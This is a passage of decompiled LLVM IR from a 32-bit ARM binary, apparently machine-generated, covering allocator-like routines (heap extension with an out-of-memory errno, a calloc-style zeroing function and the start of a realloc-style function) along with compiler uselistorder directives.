  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1257c = load i32, i32* %ip.global-to-local, align 4
  %v1_1257c = add i32 %v0_1257c, 8
  store i32 %v1_1257c, i32* @r0, align 4
  store i32 -1, i32* %v2_12574, align 4
  %v0_12584 = call i32 @function_12da0()
  store i32 %v0_12584, i32* %r0.global-to-local, align 4
  %v0_12588 = load i32, i32* @r4, align 4
  %v1_12588 = load i32, i32* @r6, align 4
  %v2_12588 = add i32 %v1_12588, 836
  %v3_12588 = inttoptr i32 %v2_12588 to i32*
  store i32 %v0_12588, i32* %v3_12588, align 4
  br label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %.thread34, %dec_label_pc_12544, %dec_label_pc_12510, %dec_label_pc_12508, %dec_label_pc_12574
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r0.global-to-local, align 4
  %v4_12594 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_12594, i32* %lr.global-to-local, align 4
  %v1_12598 = add i32 %v4_12594, 872
  store i32 %v1_12598, i32* %r1.global-to-local, align 4
  %v1_1259c = inttoptr i32 %v1_12598 to i32*
  %v2_1259c = load i32, i32* %v1_1259c, align 4
  store i32 %v2_1259c, i32* %r1.global-to-local, align 4
  %v3_1259c = add i32 %v4_12594, 876
  %v4_1259c = inttoptr i32 %v3_1259c to i32*
  %v5_1259c = load i32, i32* %v4_1259c, align 4
  store i32 %v5_1259c, i32* %r3.global-to-local, align 4
  %v1_125a4 = add i32 %v4_12594, 868
  %v2_125a4 = inttoptr i32 %v1_125a4 to i32*
  %v3_125a4 = load i32, i32* %v2_125a4, align 4
  store i32 %v3_125a4, i32* %r3.global-to-local, align 4
  %v1_125a8 = add i32 %v4_12594, 884
  %v2_125a8 = inttoptr i32 %v1_125a8 to i32*
  %v3_125a8 = load i32, i32* %v2_125a8, align 4
  store i32 %v3_125a8, i32* %r2.global-to-local, align 4
  %v2_125ac = add i32 %v3_125a4, %v2_1259c
  store i32 %v2_125ac, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_1259c, %v5_1259c
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_1258c
  store i32 %v2_1259c, i32* %v4_1259c, align 4
  %v0_125b4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_125b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_1258c, %bb165
  %v1_125b4 = phi i32 [ %v3_125a8, %dec_label_pc_1258c ], [ %v1_125b4.pre, %bb165 ]
  %v4_125b8 = phi i32 [ %v2_125ac, %dec_label_pc_1258c ], [ %v0_125b4.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_125b8, %v1_125b4
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_125b8 = load i32, i32* %lr.global-to-local, align 4
  %v6_125b8 = add i32 %v5_125b8, 884
  %v7_125b8 = inttoptr i32 %v6_125b8 to i32*
  store i32 %v4_125b8, i32* %v7_125b8, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_125bc = load i32, i32* %lr.global-to-local, align 4
  %v1_125bc = add i32 %v0_125bc, 44
  %v2_125bc = inttoptr i32 %v1_125bc to i32*
  %v3_125bc = load i32, i32* %v2_125bc, align 4
  store i32 %v3_125bc, i32* %ip.global-to-local, align 4
  %v1_125c0 = add i32 %v3_125bc, 4
  %v2_125c0 = inttoptr i32 %v1_125c0 to i32*
  %v3_125c0 = load i32, i32* %v2_125c0, align 4
  store i32 %v1_121d4, i32* %r1.global-to-local, align 4
  %v1_125c8 = and i32 %v3_125c0, -4
  store i32 %v1_125c8, i32* %r3.global-to-local, align 4
  %v3_125cc = icmp ult i32 %v1_125c8, %v1_121d4
  br i1 %v3_125cc, label %dec_label_pc_125f8, label %dec_label_pc_125d4

dec_label_pc_125d4:                               ; preds = %bb168
  %v0_125d4 = load i32, i32* @sl, align 4
  %v2_125d4 = sub i32 %v1_125c8, %v0_125d4
  %v2_125d8 = add i32 %v0_125d4, %v3_125bc
  store i32 %v2_125d8, i32* %r1.global-to-local, align 4
  %v1_125dc = or i32 %v2_125d4, 1
  store i32 %v1_125dc, i32* %r3.global-to-local, align 4
  %v1_125e0 = or i32 %v0_125d4, 1
  store i32 %v1_125e0, i32* %r2.global-to-local, align 4
  %v1_125e4 = add i32 %v3_125bc, 8
  store i32 %v1_125e4, i32* %r0.global-to-local, align 4
  store i32 %v1_125e0, i32* %v2_125c0, align 4
  %v0_125ec = load i32, i32* %r1.global-to-local, align 4
  %v1_125ec = load i32, i32* %lr.global-to-local, align 4
  %v2_125ec = add i32 %v1_125ec, 44
  %v3_125ec = inttoptr i32 %v2_125ec to i32*
  store i32 %v0_125ec, i32* %v3_125ec, align 4
  %v0_125f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_125f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_125f0 = add i32 %v1_125f0, 4
  %v3_125f0 = inttoptr i32 %v2_125f0 to i32*
  store i32 %v0_125f0, i32* %v3_125f0, align 4
  br label %dec_label_pc_12608

dec_label_pc_125f8:                               ; preds = %bb157, %bb168, %dec_label_pc_123d4
  %v0_125f8 = call i32 @function_11734()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_12600 = inttoptr i32 %v0_125f8 to i32*
  store i32 12, i32* %v2_12600, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12608

dec_label_pc_12608:                               ; preds = %bb151, %bb150, %dec_label_pc_125d4, %dec_label_pc_1221c, %dec_label_pc_125f8
  %v0_12608 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12608, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1260c

dec_label_pc_1260c:                               ; preds = %.thread1, %dec_label_pc_121e8, %.thread121, %dec_label_pc_12058, %dec_label_pc_1204c, %dec_label_pc_11eb4, %dec_label_pc_11e38, %dec_label_pc_12608
  store i32 %v2_11d60, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 126992, i32* %r2.global-to-local, align 4
  %v4_1261c = load i32, i32* inttoptr (i32 127016 to i32*), align 8
  store i32 %v4_1261c, i32* @ip, align 4
  store i32 75304, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1261c)
  br label %dec_label_pc_12628

dec_label_pc_12628:                               ; preds = %dec_label_pc_11d98, %dec_label_pc_1260c
  %v0_12628 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12628, i32* %r0.global-to-local, align 4
  store i32 %v3_11d34, i32* @r4, align 4
  store i32 %v6_11d34, i32* @r5, align 4
  store i32 %v9_11d34, i32* @r6, align 4
  store i32 %v12_11d34, i32* @r7, align 4
  store i32 %v15_11d34, i32* @r8, align 4
  store i32 %v18_11d34, i32* @sb, align 4
  store i32 %v21_11d34, i32* @sl, align 4
  store i32 %v24_11d34, i32* @fp, align 4
  store i32 %v27_11d34, i32* @lr, align 4
  ret i32 %v0_12628

; uselistorder directives
  uselistorder i32 %v0_125d4, { 1, 0, 2 }
  uselistorder i32 %v3_125bc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_125b8, { 1, 0 }
  uselistorder i32 %v2_1259c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12594, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1254c, { 1, 2, 0 }
  uselistorder i32 %v0_12514, { 1, 0 }
  uselistorder i32 %v0_12508, { 1, 0 }
  uselistorder i32 %v2_124f8, { 1, 0 }
  uselistorder i32 %v2_12488, { 2, 1, 0 }
  uselistorder i32 %v2_12470, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12468, { 1, 0, 2 }
  uselistorder i32 %v1_12464, { 2, 1, 0 }
  uselistorder i32 %v0_12464, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12448, { 1, 0 }
  uselistorder i32 %v2_12420, { 1, 0 }
  uselistorder i32 %v3_12414, { 1, 0, 2 }
  uselistorder i32 %v2_123f4, { 1, 0, 2 }
  uselistorder i32* %v2_123ec, { 1, 0, 2 }
  uselistorder i32 %v0_123d4, { 1, 0 }
  uselistorder i32 %v6_123b0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1239c, { 2, 1, 0 }
  uselistorder i32 %v0_12384, { 1, 0 }
  uselistorder i32 %v2_12340, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1233c, { 1, 0 }
  uselistorder i32 %v3_12314, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_122f4, { 1, 0, 2 }
  uselistorder i32 %v2_122dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12284, { 2, 1, 0 }
  uselistorder i32 %v6_12278, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12254, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12214, { 1, 0, 2, 3 }
  uselistorder i32 %v0_121d4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_121cc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_121c8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_121b4, { 1, 0 }
  uselistorder i32 %v7_12174, { 1, 0 }
  uselistorder i32 %v4_12174, { 1, 0 }
  uselistorder i32 %v0_12144, { 1, 0 }
  uselistorder i32 %v2_12118, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1211454, { 1, 0 }
  uselistorder i32 %v1_120e0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_120c8., { 1, 2, 0 }
  uselistorder i32 %v0_120d0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_120d0, { 1, 0 }
  uselistorder i32 %v3_120b0, { 1, 0 }
  uselistorder i32 %v4_120ac, { 1, 0, 2 }
  uselistorder i32 %v1_1201c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12074, { 1, 0 }
  uselistorder i32 %v1_12058, { 1, 0 }
  uselistorder i32 %v1_11ef8, { 1, 0 }
  uselistorder i32 %v0_12038, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12000, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12094.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11fdc, { 2, 1, 0 }
  uselistorder i32 %v3_11fd0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_11ef0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11f98, { 1, 0 }
  uselistorder i32 %v3_11f8c, { 1, 0 }
  uselistorder i32 %v0_11f98, { 1, 0 }
  uselistorder i32 %v3_11f70, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11f60, { 1, 0, 2 }
  uselistorder i32 %v3_11f18, { 2, 1, 0 }
  uselistorder i32 %v0_11f08, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11ed8, { 1, 0 }
  uselistorder i32 %v1_11e8c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11e88, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11e2c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11e20, { 1, 0 }
  uselistorder i32 %v3_11df0, { 1, 0 }
  uselistorder i32 %v0_11de4, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_11dc4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11db8, { 1, 0 }
  uselistorder i32 %v0_11d90, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 10, 0, 1, 2, 3, 4, 6, 5, 14, 15, 7, 16, 8, 9, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 107, 108, 109, 98, 99, 100, 101, 102, 103, 104, 105, 106 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 54, 42, 43, 44, 45, 46, 55, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 8, 6, 30, 7, 9, 10, 2, 22, 14, 11, 23, 12, 13, 16, 15, 20, 17, 24, 19, 18, 25, 21, 1, 27, 26, 28, 0, 29, 31, 36, 32, 33, 5, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 4, 3, 49, 50, 51, 52, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 42, 41, 28, 25, 0, 26, 27, 29, 36, 37, 38, 39, 40, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_1401c, { 1, 0 }
  uselistorder i32 (i32)* @function_11cbc, { 1, 0 }
  uselistorder label %dec_label_pc_12628, { 1, 0 }
  uselistorder label %dec_label_pc_1260c, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12608, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_125f8, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_1258c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12508, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12500, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_123d4, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_12308, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_121c0, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_12114, { 1, 0 }
  uselistorder label %dec_label_pc_1211c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_120e0, { 1, 0 }
  uselistorder label %dec_label_pc_12094, { 1, 0 }
  uselistorder label %dec_label_pc_12028, { 1, 0 }
  uselistorder label %dec_label_pc_12024, { 1, 0 }
  uselistorder label %dec_label_pc_11fd0, { 1, 0 }
  uselistorder label %dec_label_pc_11fbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11f84, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11f70, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_1263c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1263c:
  %v0_1263c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1263c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1263c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1263c, %bb
  %v10_12650 = phi i32 [ %arg1, %dec_label_pc_1263c ], [ 0, %bb ]
  ret i32 %v10_12650

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_12654(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12654:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12654 = load i32, i32* @r4, align 4
  %v6_12654 = load i32, i32* @r5, align 4
  %v9_12654 = load i32, i32* @r6, align 4
  %v12_12654 = load i32, i32* @lr, align 4
  %v2_1265c = icmp eq i32 %arg1, 0
  store i32 126992, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_1266c = mul i32 %arg2, %arg1
  store i32 %v2_1266c, i32* @r6, align 4
  br i1 %v2_1265c, label %dec_label_pc_1269c, label %dec_label_pc_12674

dec_label_pc_12674:                               ; preds = %dec_label_pc_12654
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_1266c, i32* @r0, align 4
  %v0_1267c = call i32 @function_10da8()
  %v0_12680 = load i32, i32* @r4, align 4
  %v9_12680 = icmp eq i32 %v0_12680, %v0_1267c
  br i1 %v9_12680, label %dec_label_pc_12674.dec_label_pc_1269c_crit_edge, label %dec_label_pc_12688

dec_label_pc_12674.dec_label_pc_1269c_crit_edge:  ; preds = %dec_label_pc_12674
  %v0_126a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1269c

dec_label_pc_12688:                               ; preds = %dec_label_pc_12674
  %v0_12688 = call i32 @function_11734()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_12694 = inttoptr i32 %v0_12688 to i32*
  store i32 12, i32* %v2_12694, align 4
  br label %dec_label_pc_12760

dec_label_pc_1269c:                               ; preds = %dec_label_pc_12674.dec_label_pc_1269c_crit_edge, %dec_label_pc_12654
  %v0_126b8 = phi i32 [ %v0_126a0.pre, %dec_label_pc_12674.dec_label_pc_1269c_crit_edge ], [ 126992, %dec_label_pc_12654 ]
  %v2_126a0 = add i32 %v0_126b8, 68
  %v3_126a0 = inttoptr i32 %v2_126a0 to i32*
  %v4_126a0 = load i32, i32* %v3_126a0, align 4
  store i32 %v4_126a0, i32* @r4, align 4
  %v2_126b8 = add i32 %v0_126b8, 72
  %v3_126b8 = inttoptr i32 %v2_126b8 to i32*
  %v4_126b8 = load i32, i32* %v3_126b8, align 4
  store i32 %v4_126b8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_126b8)
  %v0_126cc = load i32, i32* @r5, align 4
  %v2_126cc = add i32 %v0_126cc, 16
  %v3_126cc = inttoptr i32 %v2_126cc to i32*
  %v4_126cc = load i32, i32* %v3_126cc, align 4
  store i32 %v4_126cc, i32* %ip.global-to-local, align 4
  store i32 75480, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_126cc)
  %v0_126d8 = load i32, i32* @r6, align 4
  store i32 %v0_126d8, i32* @r0, align 4
  %v0_126dc = call i32 @function_11d34()
  store i32 %v0_126dc, i32* %r4.global-to-local, align 4
  %v2_126e0 = icmp eq i32 %v0_126dc, 0
  br i1 %v2_126e0, label %.thread, label %dec_label_pc_126e8

dec_label_pc_126e8:                               ; preds = %dec_label_pc_1269c
  %v1_126e8 = add i32 %v0_126dc, -4
  %v2_126e8 = inttoptr i32 %v1_126e8 to i32*
  %v3_126e8 = load i32, i32* %v2_126e8, align 4
  %v1_126ec = and i32 %v3_126e8, 2
  %v2_126ec = icmp eq i32 %v1_126ec, 0
  br i1 %v2_126ec, label %dec_label_pc_126f4, label %.thread

dec_label_pc_126f4:                               ; preds = %dec_label_pc_126e8
  %v1_126f47 = add i32 %v3_126e8, -4
  %v1_126f8 = and i32 %v1_126f47, -4
  store i32 %v1_126f8, i32* @r2, align 4
  %v3_126fc = udiv i32 %v1_126f8, 4
  store i32 %v3_126fc, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_126f8, 36
  %v2_12704 = icmp ult i32 %v1_126f8, 33
  %v3_12704 = or i1 %tmp, %v2_12704
  br i1 %v3_12704, label %dec_label_pc_12710, label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_126f4
  %v2_12708 = inttoptr i32 %v0_126dc to i8*
  %v3_12708 = call i32 @function_11790(i8* %v2_12708, i32 0)
  br label %.thread

dec_label_pc_12710:                               ; preds = %dec_label_pc_126f4
  %tmp8 = icmp eq i32 %v1_126f8, 16
  %v2_12714 = inttoptr i32 %v0_126dc to i32*
  store i32 0, i32* %v2_12714, align 4
  %v1_12718 = load i32, i32* %r4.global-to-local, align 4
  %v2_12718 = add i32 %v1_12718, 4
  %v3_12718 = inttoptr i32 %v2_12718 to i32*
  store i32 0, i32* %v3_12718, align 4
  %v1_1271c = load i32, i32* %r4.global-to-local, align 4
  %v2_1271c = add i32 %v1_1271c, 8
  %v3_1271c = inttoptr i32 %v2_1271c to i32*
  store i32 0, i32* %v3_1271c, align 4
  %v2_12720 = icmp ult i32 %v1_126f8, 13
  %v3_12720 = or i1 %tmp8, %v2_12720
  br i1 %v3_12720, label %.thread, label %dec_label_pc_12724

dec_label_pc_12724:                               ; preds = %dec_label_pc_12710
  %v0_12724 = load i32, i32* %ip.global-to-local, align 4
  %v1_12728 = load i32, i32* %r4.global-to-local, align 4
  %v2_12728 = add i32 %v1_12728, 12
  %v3_12728 = inttoptr i32 %v2_12728 to i32*
  store i32 0, i32* %v3_12728, align 4
  %v1_1272c = load i32, i32* %r4.global-to-local, align 4
  %v2_1272c = add i32 %v1_1272c, 16
  %v3_1272c = inttoptr i32 %v2_1272c to i32*
  store i32 0, i32* %v3_1272c, align 4
  %tmp9 = icmp ult i32 %v0_12724, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_12734

dec_label_pc_12734:                               ; preds = %dec_label_pc_12724
  %v0_12734 = load i32, i32* %ip.global-to-local, align 4
  %v7_12734 = icmp eq i32 %v0_12734, 9
  %v1_12738 = load i32, i32* %r4.global-to-local, align 4
  %v2_12738 = add i32 %v1_12738, 20
  %v3_12738 = inttoptr i32 %v2_12738 to i32*
  store i32 0, i32* %v3_12738, align 4
  %v1_1273c = load i32, i32* %r4.global-to-local, align 4
  %v2_1273c = add i32 %v1_1273c, 24
  %v3_1273c = inttoptr i32 %v2_1273c to i32*
  store i32 0, i32* %v3_1273c, align 4
  br i1 %v7_12734, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12734
  %v2_12740 = load i32, i32* %r4.global-to-local, align 4
  %v3_12740 = add i32 %v2_12740, 32
  %v4_12740 = inttoptr i32 %v3_12740 to i32*
  store i32 0, i32* %v4_12740, align 4
  %v2_12744 = load i32, i32* %r4.global-to-local, align 4
  %v3_12744 = add i32 %v2_12744, 28
  %v4_12744 = inttoptr i32 %v3_12744 to i32*
  store i32 0, i32* %v4_12744, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12734, %dec_label_pc_126e8, %dec_label_pc_12724, %dec_label_pc_12710, %dec_label_pc_1269c, %dec_label_pc_12708, %bb
  %v0_12754 = load i32, i32* @r5, align 4
  %v2_12754 = add i32 %v0_12754, 24
  %v3_12754 = inttoptr i32 %v2_12754 to i32*
  %v4_12754 = load i32, i32* %v3_12754, align 4
  store i32 %v4_12754, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_12754)
  br label %dec_label_pc_12760

dec_label_pc_12760:                               ; preds = %dec_label_pc_12688, %.thread
  %v0_12760 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12654, i32* @r4, align 4
  store i32 %v6_12654, i32* @r5, align 4
  store i32 %v9_12654, i32* @r6, align 4
  store i32 %v12_12654, i32* @lr, align 4
  ret i32 %v0_12760

; uselistorder directives
  uselistorder i32 %v1_126f8, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v0_126dc, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 33, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12760, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_12774(i32 %arg1) local_unnamed_addr {
dec_label_pc_12774:
  %v0_12774 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12774, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12774
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12774, %bb
  %v10_12784 = phi i32 [ %arg1, %dec_label_pc_12774 ], [ 0, %bb ]
  ret i32 %v10_12784

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_12788(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12788:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12788 = load i32, i32* @r4, align 4
  %v6_12788 = load i32, i32* @r5, align 4
  %v9_12788 = load i32, i32* @r6, align 4
  %v12_12788 = load i32, i32* @r7, align 4
  %v15_12788 = load i32, i32* @r8, align 4
  %v18_12788 = load i32, i32* @sb, align 4
  %v21_12788 = load i32, i32* @sl, align 4
  %v24_12788 = load i32, i32* @fp, align 4
  %v27_12788 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12794 = icmp eq i32* %arg1, null
  store i32 126992, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12794, label %dec_label_pc_127a8, label %dec_label_pc_127b8

dec_label_pc_127a8:                               ; preds = %dec_label_pc_12788
  store i32 %arg2, i32* @r0, align 4
  %v0_127ac = call i32 @function_11d34()
  store i32 %v0_127ac, i32* %r0.global-to-local, align 4
  store i32 %v0_127ac, i32* @r4, align 4
  br label %dec_label_pc_12b10

dec_label_pc_127b8:                               ; preds = %dec_label_pc_12788
  %v2_127b8 = icmp eq i32 %arg2, 0
  br i1 %v2_127b8, label %dec_label_pc_127c0, label %dec_label_pc_127cc

dec_label_pc_127c0:                               ; preds = %dec_label_pc_127b8
  %v0_127c0 = call i32 @function_12da0()
  store i32 %v0_127c0, i32* %r0.global-to-local, align 4
  %v0_127c4 = load i32, i32* @r6, align 4
  store i32 %v0_127c4, i32* @r4, align 4
  br label %dec_label_pc_12b10

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127b8
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_127d4 = load i32, i32* inttoptr (i32 127060 to i32*), align 4
  store i32 %v4_127d4, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_127d4, i32* %r2.global-to-local, align 4
  %v4_127e0 = load i32, i32* inttoptr (i32 127028 to i32*), align 4
  store i32 %v4_127e0, i32* %r1.global-to-local, align 4
  %v2_127e4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_127e4, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_127ec = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_127ec)
  %v0_127f8 = load i32, i32* @r4, align 4
  store i32 %v0_127f8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  %v4_12804 = load i32, i32* inttoptr (i32 127008 to i32*), align 32
  store i32 %v4_12804, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_12810.381 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12804)
  %v0_12810 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12810, -32
  br i1 %tmp36, label %dec_label_pc_1282c, label %dec_label_pc_12818

dec_label_pc_12818:                               ; preds = %dec_label_pc_127cc
  %v0_12818 = call i32 @function_11734()
  store i32 %v0_12818, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_12824 = inttoptr i32 %v0_12818 to i32*
  store i32 12, i32* %v2_12824, align 4
  br label %dec_label_pc_12b10

dec_label_pc_1282c:                               ; preds = %dec_label_pc_127cc
  %v1_1282c = add i32 %v0_12810, 11
  store i32 %v1_1282c, i32* %r0.global-to-local, align 4
  %v0_12830 = load i32, i32* @r5, align 4
  %v1_12830 = add i32 %v0_12830, -4
  %v2_12830 = inttoptr i32 %v1_12830 to i32*
  %v3_12830 = load i32, i32* %v2_12830, align 4
  store i32 %v3_12830, i32* %r2.global-to-local, align 4
  %v2_12834 = icmp ugt i32 %v1_1282c, 14
  %v7_12834 = icmp eq i32 %v1_1282c, 15
  %v2_12838 = xor i1 %v2_12834, true
  %v3_12838 = or i1 %v7_12834, %v2_12838
  br i1 %v3_12838, label %bb, label %bb27

